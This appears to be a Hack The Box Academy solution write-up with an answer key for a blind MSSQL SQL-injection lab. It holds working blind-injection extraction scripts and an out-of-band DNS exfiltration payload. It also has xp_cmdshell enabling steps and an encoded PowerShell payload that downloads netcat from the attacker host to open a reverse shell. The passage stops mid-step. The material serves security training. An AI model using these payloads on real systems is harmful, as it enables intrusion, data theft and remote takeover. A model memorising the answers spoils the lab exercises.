| Section                          | Question Number | Answer                                                       |
| -------------------------------- | --------------- | ------------------------------------------------------------ |
| Introduction to MSSQL/SQL Server | Question 1      | $2y$10$RG9sb3JlbSBhbWV0IGV0aW5jaWR1bnQgdGVtcG9yYSBuZXF1ZSBkb |
| Designing the Oracle             | Question 1      | 3                                                            |
| Extracting Data                  | Question 1      | 32                                                           |
| Extracting Data                  | Question 2      | 9c6f8704f305b22c538c14207650ccda                             |
| Oracle Design                    | Question 1      | r                                                            |
| Data Extraction                  | Question 1      | HTB{b1db0c85bb732495a4101c5d41683527}                        |
| Out-of-Band DNS                  | Question 1      | HTB{94362aee5f61dc329860fa4c6eb4c4ba}                        |
| Remote Code Execution            | Question 1      | 10.0.20348 N/A Build 20348                                   |
| Leaking NetNTLM Hashes           | Question 1      | Meduniwien                                                   |
| File Read                        | Question 1      | HTB{049df28ef2c92ee1614568e0fd5c9e4d}                        |
| Skills Assessment                | Question 1      | 8315744aa239bdba3464d255af507bc9                             |
| Skills Assessment                | Question 2      | eclipse1                                                     |
| Skills Assessment                | Question 3      | b8946a2a6bf381b35d6669ded25a14a2                             |
| Skills Assessment                | Question 4      | jesus07                                                      |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Introduction to MSSQL/SQL Server

## Question 1

### "Find the password hash of the first user matching these criteria: (1) First name begins with an 'S' (2) Email is bigger than 20 characters long (3) Wrote a post with a title beginning with the letter 'N' (4) Sorted by first name ascending."

After spawning the target machine, students need to connect to the SQL server using `impacket-mssqlclient` with the credentials `thomas:TopSecretPassword23!`, specifying "bsqlintro" as the landing database name:

Code: shell

```shell
impacket-mssqlclient thomas:'TopSecretPassword23!'@STMIP -db bsqlintro
```

```
┌─[eu-academy-1]─[10.10.15.56]─[htb-ac413848@htb-b2gaoxkdgh]─[~]
└──╼ [★]$ impacket-mssqlclient thomas:'TopSecretPassword23!'@10.129.204.197 -db bsqlintro

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: bsqlintro
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01): Line 1: Changed database context to 'bsqlintro'.
[*] INFO(SQL01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL>
```

Subsequently, students need to list the tables that exist within the "bsqlintro" database, finding "users" and "posts":

Code: sql

```sql
SELECT TABLE_NAME FROM bsqlintro.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
```

Code: sql

```sql
SQL> SELECT TABLE_NAME FROM bsqlintro.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';

TABLE_NAME

---------------------------------------

users

posts
```

To be able to query the two tables, students first need to know the columns contained within them; the "users" table contains the columns "id", "username", "email", "firstName", "lastName", "password", and "activationKey":

Code: sql

```sql
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';
```

Code: sql

```sql
SQL> SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';

COLUMN_NAME

----------------------------------------------

id

username

email

firstName

lastName

password

activationKey
```

While the "posts" table contains the columns "id", "authorId", "title", and "content":

Code: sql

```sql
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'posts';
```

Code: sql

```sql
SQL> SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'posts';

COLUMN_NAME

--------------------------------------------------------------------

id

authorId

title

content
```

Having enumerated the column names from both tables, students can now retrieve the first hash that meets the requirements of the question, finding it to be `$2y$10$RG9sb3JlbSBhbWV0IGV0aW5jaWR1bnQgdGVtcG9yYSBuZXF1ZSBkb`:

Code: sql

```sql
SELECT TOP 1 password FROM users JOIN posts ON posts.authorId = users.id WHERE firstName LIKE 'S%' AND LEN(email) > 20 AND title LIKE 'N%' ORDER BY firstName ASC;
```

Code: sql

```sql
SQL> SELECT TOP 1 password FROM users JOIN posts ON posts.authorId = users.id WHERE firstName LIKE 'S%' AND LEN(email) > 20 AND title LIKE 'N%' ORDER BY firstName ASC;

password

------------------------------------------------------------------------

b'$2y$10$RG9sb3JlbSBhbWV0IGV0aW5jaWR1bnQgdGVtcG9yYSBuZXF1ZSBkb'
```

Answer: `$2y$10$RG9sb3JlbSBhbWV0IGV0aW5jaWR1bnQgdGVtcG9yYSBuZXF1ZSBkb`

# Designing the Oracle

## Question 1

### "Use the oracle to figure out the number of rows in the 'users' table. You can use the query listed above under the Question heading as a base."

After spawning the target machine, students need to utilize the Python script provided in the module's section, however, modifying it to run a while loop to query the database with `SELECT COUNT(*) FROM USERS = i`, where "i" is a number, until it evaluates to true to attain the number of rows:

Code: python

```python
i = 0
while not oracle(f"(SELECT COUNT(*) FROM USERS) = {i}"):
    i += 1
else:
    print(f"Number of rows is {i}")
```

Code: python

```python
#!/usr/bin/env python3

import requests, json, sys
from urllib.parse import quote_plus

target = "maria"

def oracle(query):
    payload = quote_plus(f"{target}' AND ({query})-- -");
    response = requests.get(f"http://STMIP/api/check-username.php?u={payload}")
    jsonResponse = json.loads(response.text)
    return jsonResponse['status'] == 'taken'

i = 0
while not oracle(f"(SELECT COUNT(*) FROM USERS) = {i}"):
    i += 1
else:
    print(f"Number of rows is {i}")
```

After running the script, students will find that the number of rows is `3`:

Code: shell

```shell
python3 oracle.py
```

```
┌─[eu-academy-1]─[10.10.15.56]─[htb-ac413848@htb-q6w8uyafra]─[~]
└──╼ [★]$ python3 oracle.py

Number of rows is 3
```

Answer: `3`

# Extracting Data

## Question 1

### "What is the length of maria's password (hash)?"

After spawning the target machine, students need to utilize the Python script provided in the module's section, however, modifying it to run a while loop to query the database with `LEN(password) = i`, where "i" is a number, until it evaluates to true to attain the length of maria's password:

Code: python

```python
i = 0
while not oracle(f"(LEN(password)) = {i}"):
    i += 1
else:
    print(f"Length of password: {i}")
```

Code: python

```python
#!/usr/bin/env python3

import requests, json, sys
from urllib.parse import quote_plus

target = "maria"

def oracle(query):
    payload = quote_plus(f"{target}' AND ({query})-- -");
    response = requests.get(f"http://STMIP/api/check-username.php?u={payload}")
    jsonResponse = json.loads(response.text)
    return jsonResponse['status'] == 'taken'

i = 0
while not oracle(f"(LEN(password)) = {i}"):
    i += 1
else:
    print(f"Length of password: {i}")
```

After running the script, students will know that the length of maria's password hash is `32`:

Code: shell

```shell
python3 oracle.py
```

```
┌─[eu-academy-1]─[10.10.15.56]─[htb-ac413848@htb-pndthu06j5]─[~]
└──╼ [★]$ python3 oracle.py

Length of password: 32
```

Answer: `32`

# Extracting Data

## Question 2

### "What is maria's password (hash)?"

After spawning the target machine, students need to utilize the Python script provided in the module's section, however, modifying it to run a for loop to query the database with `ASCII(SUBSTRING(password, i, 1)) = character`, where "i" is the index number between 1 and 32, and "character" is an ASCII character from the range of 0-128, until it fetches the characters of the entire hash from the database:

Code: python

```python
for i in range(1, passwordLength + 1):
    for character in range (0, 128):
        if oracle(f"ASCII(SUBSTRING(password, {i}, 1)) = {character}"):
            print(chr(character), end = '')
            sys.stdout.flush()
```

Code: python

```python
#!/usr/bin/env python3

import requests, json, sys, time
from urllib.parse import quote_plus

target = "maria"

def oracle(query):
    payload = quote_plus(f"{target}' AND ({query})-- -");
    response = requests.get(f"http://STMIP/api/check-username.php?u={payload}")
    jsonResponse = json.loads(response.text)
    return jsonResponse['status'] == 'taken'

passwordLength = 32
print("Password: ", end = '')

for i in range(1, passwordLength + 1):
    for character in range (0, 128):
        if oracle(f"ASCII(SUBSTRING(password, {i}, 1)) = {character}"):
            print(chr(character), end = '')
            sys.stdout.flush()
print()
```

After running the script, students will attain the flag `9c6f8704f305b22c538c14207650ccda` (in case the script fails, students may reset the spawned target machine and retry running it, if the problem persists, students can use the `sleep` function from the `time` module to slow down the number of requests being sent after the function `oracle` is called, as in `time.sleep(5)`):

Code: shell

```shell
python3 oracle.py
```

```
┌─[eu-academy-1]─[10.10.15.56]─[htb-ac413848@htb-pndthu06j5]─[~]
└──╼ [★]$ python3 oracle.py

Password: 9c6f8704f305b22c538c14207650ccda
```

Answer: `9c6f8704f305b22c538c14207650ccda`

# Oracle Design

## Question 1

### "Question: Use the oracle to figure out the fifth letter of 'db\_name()'. You can use the query listed above under the 'Question' heading as a base."

After spawning the target machine, students need to utilize the Python script provided in the module's section, however, modifying it to run a for loop to query the database with `ASCII(SUBSTRING(DB_NAME(), 5, 1)) = character`, where "character" is an ASCII character from the range of 97-123 since it is a lowercase letter, until it fetches the fifth letter of "DB\_NAME()":

Code: python

```python
for i in range(97, 123):
    if oracle(f"(SELECT SUBSTRING(DB_NAME(), 5, 1)) = '{chr(i)}'"):
        print(f"The fifth letter of DB_NAME() is '{chr(i)}'")
        break
```

Code: python

```python
#!/usr/bin/env python3

import requests, time

DELAY = 5

def oracle(q):
    start = time.time()
    response = requests.get("http://STMIP:8080/", headers = {"User-Agent": f"htb'; IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"})
    return time.time() - start >= DELAY

for i in range(97, 123):
    if oracle(f"(SELECT SUBSTRING(DB_NAME(), 5, 1)) = '{chr(i)}'"):
        print(f"The fifth letter of DB_NAME() is '{chr(i)}'")
        break
```

After running the script, students will know that the fifth letter of "DB\_NAME()" is `r`:

Code: shell

```shell
python3 oracle.py
```

```
┌─[eu-academy-1]─[10.10.15.56]─[htb-ac413848@htb-wkepd8ksms]─[~]
└──╼ [★]$ python3 oracle.py

The fifth letter of DB_NAME() is 'r'
```

Answer: `r`

# Data Extraction

## Question 1

### "Dump the flag from the 'flag' table."

After spawning the target machine and using the already provided information in the module's section (which is all saved in variables), students first need to determine the number of rows in the "flag" table:

Code: python

```python
DBNameLength = 8
DBName = "digcraft"
tablesNumber = 2
tableOneNameLength = 4 
tableOneName = "flag"
tableTwoNameLength = 10
tableTwoName = "userAgents"
columnsData = {"column0NameLength": 4, "column0Name": "flag"}

numberOfRows = dumpNumber("SELECT COUNT(*) FROM flag")
```

Code: python

```python
#!/usr/bin/env python3

import requests, time

DELAY = 3

def oracle(q):
    start = time.time()
    response = requests.get("http://STMIP:8080/", headers = {"User-Agent": f"htb'; IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"})
    return time.time() - start >= DELAY
def dumpNumber(q):
    length = 0
    for p in range(0, 7):
        if oracle(f"({q}) & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(q, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range (0, 7):
            if oracle(f"ASCII(SUBSTRING(({q}), {i}, 1)) & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
    return string

DBNameLength = 8
DBName = "digcraft"
tablesNumber = 2
tableOneNameLength = 4 
tableOneName = "flag"
tableTwoNameLength = 10
tableTwoName = "userAgents"
columnsData = {"column0NameLength": 4, "column0Name": "flag"}

numberOfRows = dumpNumber("SELECT COUNT(*) FROM flag")
print(numberOfRows)
```

After running the script, students will find that there is only one row:

Code: shell

```shell
python3 oracle.py
```

```
┌─[eu-academy-1]─[10.10.15.56]─[htb-ac413848@htb-lr1teebkb5]─[~]
└──╼ [★]$ python3 oracle.py

1
```

Then, students need to fetch the length of data in that cell in the first row:

Code: python

```python
row1Length = dumpNumber("SELECT TOP 1 LEN(flag) FROM flag")
```

Code: python

```python
#!/usr/bin/env python3

import requests, time

DELAY = 3

def oracle(q):
    start = time.time()
    response = requests.get("http://STMIP:8080/", headers = {"User-Agent": f"htb'; IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"})
    return time.time() - start >= DELAY
def dumpNumber(q):
    length = 0
    for p in range(0, 7):
        if oracle(f"({q}) & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(q, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range (0, 7):
            if oracle(f"ASCII(SUBSTRING(({q}), {i}, 1)) & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
    return string

DBNameLength = 8

DBName = "digcraft"

tablesNumber = 2

tableOneNameLength = 4 
tableOneName = "flag"
tableTwoNameLength = 10
tableTwoName = "userAgents"

columnsData = {"column0NameLength": 4, "column0Name": "flag"}

numberOfRows = 1

row1Length = dumpNumber(f"SELECT TOP 1 LEN(flag) FROM flag")
print(row1Length)
```

After running the script, students will find that the length of the data in that cell is 37 characters long:

Code: shell

```shell
python3 oracle.py
```

```
┌─[eu-academy-1]─[10.10.15.56]─[htb-ac413848@htb-lr1teebkb5]─[~]
└──╼ [★]$ python3 oracle.py

37
```

At last, students need to dump the value of that cell:

Code: python

```python
row1Value = dumpString("SELECT TOP 1 flag FROM flag", row1Length)
```

Code: python

```python
#!/usr/bin/env python3

import requests, time, sys

DELAY = 3

def oracle(q):
    start = time.time()
    response = requests.get("http://STMIP:8080/", headers = {"User-Agent": f"htb'; IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"})
    return time.time() - start >= DELAY
def dumpNumber(q):
    length = 0
    for p in range(0, 7):
        if oracle(f"({q}) & {2**p} > 0"):
            length |= 2**p
    return length

def dumpString(q, length):
    string = ""
    for i in range(1, length + 1):
        character = 0
        for p in range (0, 7):
            if oracle(f"ASCII(SUBSTRING(({q}), {i}, 1)) & {2**p} > 0"):
                character |= 2**p
        string += chr(character)
        print(chr(character), end = '')
        sys.stdout.flush()
    return string

DBNameLength = 8

DBName = "digcraft"

tablesNumber = 2

tableOneNameLength = 4 
tableOneName = "flag"
tableTwoNameLength = 10
tableTwoName = "userAgents"

columnsData = {"column0NameLength": 4, "column0Name": "flag"}

numberOfRows = 1

row1Length = 37

row1Value = dumpString("SELECT TOP 1 flag FROM flag", row1Length)
```

After running the script, students will attain the flag `HTB{b1db0c85bb732495a4101c5d41683527}`:

Code: shell

```shell
python3 oracle.py
```

```
┌─[eu-academy-1]─[10.10.15.56]─[htb-ac413848@htb-lr1teebkb5]─[~]
└──╼ [★]$ python3 oracle.py

HTB{b1db0c85bb732495a4101c5d41683527}
```

Answer: `HTB{b1db0c85bb732495a4101c5d41683527}`

# Out-of-Band DNS

## Question 1

### "Use Out-of-Band DNS data exfiltration to find the value of 'flag' in the 'flag' table within the Donuts web application."

After spawning the target machine, students need to visit the `Technitium DNS Server` on port 5380 and click on `Close` --> `Zones`:

![[HTB Solutions/CWEE/z. images/48dc1f3618a71917edfd1ff5a3a274b5_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/1da1d4b5fd05a6f886fb13bb97470bf7_MD5.jpg]]

Then, students need to add a new primary zone, giving it any name. To remain stealthy, it is a best practice not to choose names that will raise the suspicion of the blue team, `go0gle.com.my` will be used here (the zone name is case-insensitive):

![[HTB Solutions/CWEE/z. images/f6c37e71e97ec86c961f77f742b4579d_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/89e39412f645ae86e276f91d63d79690_MD5.jpg]]

Subsequently, students need to add an A record that will forward requests to `PWNIP` with the name `@` (which is a wild card that will match any sub-domain/record):

![[HTB Solutions/CWEE/z. images/f74853ff11ab07e0f55a0b3dc29d95b3_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/09a2c92cb8583dab1e7dd5fed3ff171f_MD5.jpg]]

Now, students need to use any payload that will exfiltrate the "flag" cell and URL-encode it ([Recipe](https://gchq.github.io/CyberChef/#recipe=URL_Encode\(true\)&input=bWFyaWEnO0RFQ0xBUkUgQFQgVkFSQ0hBUihNQVgpOyBERUNMQVJFIEBBIFZBUkNIQVIoNjMpOyBERUNMQVJFIEBCIFZBUkNIQVIoNjMpOyBTRUxFQ1QgQFQ9Q09OVkVSVChWQVJDSEFSKE1BWCksIENPTlZFUlQoVkFSQklOQVJZKE1BWCksIGZsYWcpLCAxKSBmcm9tIGZsYWc7IFNFTEVDVCBAQT1TVUJTVFJJTkcoQFQsMyw2Myk7IFNFTEVDVCBAQj1TVUJTVFJJTkcoQFQsMys2Myw2Myk7IFNFTEVDVCAqIEZST00gZm5fdHJhY2VfZ2V0dGFibGUoJ1xcJytAQSsnLicrQEIrJy5nTzBnbGUuY29tLm15XHgudHJjJyxERUZBVUxUKTstLSAt)), abusing the injection vulnerability previously discovered in Aunt's Maria's Donuts web application:

Code: sql

```sql
maria';DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) from flag; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63); SELECT * FROM fn_trace_gettable('\\'+@A+'.'+@B+'.gO0gle.com.my\x.trc',DEFAULT);-- -
```

Code: sql

```sql
maria%27%3BDECLARE%20%40T%20VARCHAR%28MAX%29%3B%20DECLARE%20%40A%20VARCHAR%2863%29%3B%20DECLARE%20%40B%20VARCHAR%2863%29%3B%20SELECT%20%40T%3DCONVERT%28VARCHAR%28MAX%29%2C%20CONVERT%28VARBINARY%28MAX%29%2C%20flag%29%2C%201%29%20from%20flag%3B%20SELECT%20%40A%3DSUBSTRING%28%40T%2C3%2C63%29%3B%20SELECT%20%40B%3DSUBSTRING%28%40T%2C3%2B63%2C63%29%3B%20SELECT%20%2A%20FROM%20fn%5Ftrace%5Fgettable%28%27%5C%5C%27%2B%40A%2B%27%2E%27%2B%40B%2B%27%2EgO0gle%2Ecom%2Emy%5Cx%2Etrc%27%2CDEFAULT%29%3B%2D%2D%20%2D
```

```
http://STMIP/api/check-username.php?u=maria%27%3BDECLARE%20%40T%20VARCHAR%28MAX%29%3B%20DECLARE%20%40A%20VARCHAR%2863%29%3B%20DECLARE%20%40B%20VARCHAR%2863%29%3B%20SELECT%20%40T%3DCONVERT%28VARCHAR%28MAX%29%2C%20CONVERT%28VARBINARY%28MAX%29%2C%20flag%29%2C%201%29%20from%20flag%3B%20SELECT%20%40A%3DSUBSTRING%28%40T%2C3%2C63%29%3B%20SELECT%20%40B%3DSUBSTRING%28%40T%2C3%2B63%2C63%29%3B%20SELECT%20%2A%20FROM%20fn%5Ftrace%5Fgettable%28%27%5C%5C%27%2B%40A%2B%27%2E%27%2B%40B%2B%27%2EgO0gle%2Ecom%2Emy%5Cx%2Etrc%27%2CDEFAULT%29%3B%2D%2D%20%2D
```

After sending the request, students will receive the response "taken", thus, the query evaluated to `true` in the backend:

![[HTB Solutions/CWEE/z. images/abb29bbd1b72b8c3dc51925b77e605f9_MD5.jpg]]

Afterward, students need to check the DNS logs back in `Technitium DNS` by clicking on `Logs` --> `Query Logs` then on `Query`; students need to search for an entry that contains a hex-encoded payload separated by two dots. After finding the request, students need to decode it as hexadecimal with CyberChef ([Recipe](https://gchq.github.io/CyberChef/#recipe=From_Hex\('Auto'\)&input=NDg1NDQyN2IzOTM0MzMzNjMyNjE2NTY1MzU2NjM2MzE2NDYzMzMzMjM5MzgzNjMwNjY2MTM0NjMzNjY1NjIzNDYzMzQ2MjYxN2Q)) to attain the flag `HTB{94362aee5f61dc329860fa4c6eb4c4ba}`:

![[HTB Solutions/CWEE/z. images/9cacb813fae8ff3b3e3a7e6f2e8405e8_MD5.jpg]]

Answer: `HTB{94362aee5f61dc329860fa4c6eb4c4ba}`

# Remote Code Execution

## Question 1

### "Gain RCE on the server, run 'systeminfo', and enter the value of 'OS Version' as the answer."

After spawning the target machine, students first need to verify that the user running the queries in the backend is the `sa` user (or posses `sa` privileges):

Code: sql

```sql
IS_SRVROLEMEMBER('sysadmin')
```

Code: sql

```sql
maria' AND IS_SRVROLEMEMBER('sysadmin')=1;--
```

To URL-encode the payload, students can use `jq`:

Code: shell

```shell
printf %s "maria' AND IS_SRVROLEMEMBER('sysadmin')=1;--" | jq -rR @uri
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ printf %s "maria' AND IS_SRVROLEMEMBER('sysadmin')=1;--" | jq -rR @uri

maria'%20AND%20IS_SRVROLEMEMBER('sysadmin')%3D1%3B--
```

Subsequently, students need to send the payload with `cURL`, receiving the response "taken", thus, the query evaluated to `true`, indicating that the user running the queries in the backend is the `sa` user (or rather, is an `sa` user):

Code: shell

```shell
curl -w "\n" -s "http://STMIP/api/check-username.php?u=maria'%20AND%20IS_SRVROLEMEMBER('sysadmin')%3D1%3B--"
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ curl -w "\n" -s "http://10.129.204.197/api/check-username.php?u=maria'%20AND%20IS_SRVROLEMEMBER('sysadmin')%3D1%3B--"

{"status":"taken"}
```

Afterward, students need to enable `Advanced Options`:

Code: sql

```sql
EXEC sp_configure 'Show Advanced Options', '1';RECONFIGURE;--
```

Code: shell

```shell
printf %s "'EXEC sp_configure 'Show Advanced Options', '1';RECONFIGURE;--" | jq -rR @uri
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ printf %s "'EXEC sp_configure 'Show Advanced Options', '1';RECONFIGURE;--" | jq -rR @uri

'EXEC%20sp_configure%20'Show%20Advanced%20Options'%2C%20'1'%3BRECONFIGURE%3B--
```

Code: shell

```shell
curl -w "\n" -s "http://STMIP/api/check-username.php?u='EXEC%20sp_configure%20'Show%20Advanced%20Options'%2C%20'1'%3BRECONFIGURE%3B--"
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ curl -w "\n" -s "http://10.129.204.197/api/check-username.php?u='EXEC%20sp_configure%20'Show%20Advanced%20Options'%2C%20'1'%3BRECONFIGURE%3B--"

{"status":"available"}
```

Although the response states "available", it does not matter in this case, as the query will not evaluate to true or false. Then, students need to enable `xp_cmdshell`:

Code: shell

```shell
EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE;--
```

Code: shell

```shell
printf %s "'EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE;--" | jq -rR @uri
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ printf %s "'EXEC sp_configure 'xp_cmdshell', '1'; RECONFIGURE;--" | jq -rR @uri

'EXEC%20sp_configure%20'xp_cmdshell'%2C%20'1'%3B%20RECONFIGURE%3B--
```

Code: shell

```shell
curl -w "\n" -s "http://STMIP/api/check-username.php?u='EXEC%20sp_configure%20'xp_cmdshell'%2C%20'1'%3B%20RECONFIGURE%3B--"
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ curl -w "\n" -s "http://10.129.208.121/api/check-username.php?u='EXEC%20sp_configure%20'xp_cmdshell'%2C%20'1'%3B%20RECONFIGURE%3B--"

{"status":"available"}
```

Next, students can test if `xp_cmdshell` was enabled successfully by sending ICMP requests with `ping` to `Pwnbox`/`PMVPN`:

Code: sql

```sql
EXEC xp_cmdshell 'ping /n 4 PWNIP'
```

Code: shell

```shell
printf %s "'EXEC xp_cmdshell 'ping /n 4 PWNIP'" | jq -rR @uri
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ printf %s "'EXEC xp_cmdshell 'ping /n 4 10.10.15.75'" | jq -rR @uri

'EXEC%20xp_cmdshell%20'ping%20%2Fn%204%2010.10.15.75'
```

Before sending the request, students need to start `tcpdump`, specify the interface `tun0`, and the protocol to `icmp`:

Code: shell

```shell
sudo tcpdump -i tun0 icmp
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-9o4uijujjg]─[~]
└──╼ [★]$ sudo tcpdump -i tun0 icmp

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Then, students need to send the payload with `cURL`, and when checking `tcpdump`, they will notice that there are 4 ICMP requests:

Code: shell

```shell
curl -w "\n" -s "http://STMIP/api/check-username.php?u='EXEC%20xp_cmdshell%20'ping%20%2Fn%204%20PWNIP'--"
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-5s0g9o30bg]─[~]
└──╼ [★]$ curl -w "\n" -s "http://10.129.208.121/api/check-username.php?u='EXEC%20xp_cmdshell%20'ping%20%2Fn%204%2010.10.15.75'--"

{"status":"available"}
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-9o4uijujjg]─[~]
└──╼ [★]$ sudo tcpdump -i tun0 icmp

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:50:58.415720 IP 10.129.115.109 > 10.10.15.75: ICMP echo request, id 1, seq 1, length 40
19:50:58.415750 IP 10.10.15.75 > 10.129.115.109: ICMP echo reply, id 1, seq 1, length 40
19:50:59.431152 IP 10.129.115.109 > 10.10.15.75: ICMP echo request, id 1, seq 2, length 40
19:50:59.431186 IP 10.10.15.75 > 10.129.115.109: ICMP echo reply, id 1, seq 2, length 40
19:51:00.450952 IP 10.129.115.109 > 10.10.15.75: ICMP echo request, id 1, seq 3, length 40
19:51:00.450979 IP 10.10.15.75 > 10.129.115.109: ICMP echo reply, id 1, seq 3, length 40
19:51:01.462266 IP 10.129.115.109 > 10.10.15.75: ICMP echo request, id 1, seq 4, length 40
19:51:01.462290 IP 10.10.15.75 > 10.129.115.109: ICMP echo reply, id 1, seq 4, length 40
```

Thus, `xp_cmdshell` has been enabled successfully.

Now, to attain a reverse shell, students need to use a `PowerShell` payload that will upload a Windows `netcat` binary to the target machine, then initiate a reverse shell connection using it (students need to make sure that `PWNPO` specified for the web server is different from the one that `nc` is listening on):

Code: powershell

```powershell
(new-object net.webclient).downloadfile("http://PWNIP:PWNPO/nc.exe", "c:\windows\tasks\nc.exe");
c:\windows\tasks\nc.exe -nv PWNIP PWNPO -e c:\windows\system32\cmd.exe;
```

To encode the payload, students need to convert it to `UTF-16LE` (`16-bit Unicode Transformation Format Little-Endian`) and then Base64-encode it. Students can use the following Python3 one-liner to encode the payload, replacing `PAYLOAD` with the actual `PowerShell` one:

```
python3 -c 'import base64; print(base64.b64encode((r"""PAYLOAD""").encode("utf-16-le")).decode())'
```

```
┌─[us-academy-1]─[10.10.15.2]─[htb-ac413848@htb-9o4uijujjg]─[~]
└──╼ [★]$ python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://10.10.15.75:9001/nc.exe", "c:\windows\tasks\nc.exe"); c:\windows\tasks\nc.exe -nv 10.10.15.75 9002 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'

KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4ANwA1ADoAOQAwADAAMQAvAG4AYwAuAGUAeABlACIALAAgACIAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACIAKQA7ACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADAALgAxADUALgA3ADUAIAA5ADAAMAAyACAALQBlACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAGMAbQBkAC4AZQB4AGUAOwA=
```

Additionally, students need to URL-encode the `PowerShell` payload with the SQLi payload:

Code: shell

```shell
printf %s "'EXEC xp_cmdshell 'powershell.exe -exec bypass -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4ANwA1ADoAOQAwADAAMQAvAG4AYwAuAGUAeABlACIALAAgACIAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACIAKQA7ACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADAALgAxADUALgA3ADUAIAA5ADAAMAAyACAALQBlACAAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHMAeQBzAHQAZQBtADMAMgBcAGMAbQBkAC4AZQB4AGUAOwA='--" | jq -rR @uri
```

```
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac413848@htb-5s0g9o30bg]─[~]
